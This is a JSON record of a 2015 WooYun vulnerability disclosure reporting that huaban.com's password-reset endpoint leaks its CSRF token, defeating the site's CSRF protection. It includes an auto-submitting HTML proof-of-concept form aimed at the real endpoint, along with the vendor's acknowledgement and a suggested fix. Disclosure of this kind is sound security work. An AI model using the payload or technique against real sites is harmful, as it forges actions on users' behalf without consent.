{"id": 36566, "wybug_id": "wooyun-2015-0101573", "wybug_title": "花瓣网全站点多处功能设计缺陷导致跨站请求伪造(CSRF)#2(绕过X-CSRF-Token限制)", "wybug_corp": "huaban.com", "wybug_author": "安然意境", "wybug_date": "2015-03-17 15:30", "wybug_open_date": "2015-05-01 15:36", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用", "利用技巧", "绕过", "利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-01：\t细节向公众公开  简要描述： 花瓣网全站点多处功能设计缺陷导致跨站请求伪造(CSRF)#2(绕过X-CSRF-Token限制) 详细说明：  花瓣网全站点多处功能设计缺陷导致跨站请求伪造(CSRF)#2(绕过X-CSRF-Token限制)。\n接口：http://huaban.com/password/reset/方式：POST提交数据：email:*****@qq.com（只需要提交一个没有注册过的邮箱地址即可。）返回{\"err\":403,\"msg\":\"邮箱地址不存在\",\"_csrf\":\"*****\"}\n此处页面返回X-CSRF-Token，全站关于CSRF的防御将会因此全部无效。   漏洞证明：  \n\n顺便附带poc代码：\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><title>CSRF  POC</title></head><body><form action=\"http://huaban.com/password/reset/\" method=\"post\"><input type=\"hidden\" name=\"email\" value=\"*********@qq.com\"/></form><script>  document.forms[0].submit();</script> </body></html>\n   修复方案：  相关接口严禁返回X-CSRF-Token.   版权声明：转载请注明来源 安然意境@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-03-17 15:35 厂商回复： 感谢您关注，我们将在第一时间修复. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-06 23:27 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  我觉的这个应该配合爆破，你说呢    \n     2015-04-07 13:35 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  token没有绑定session？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}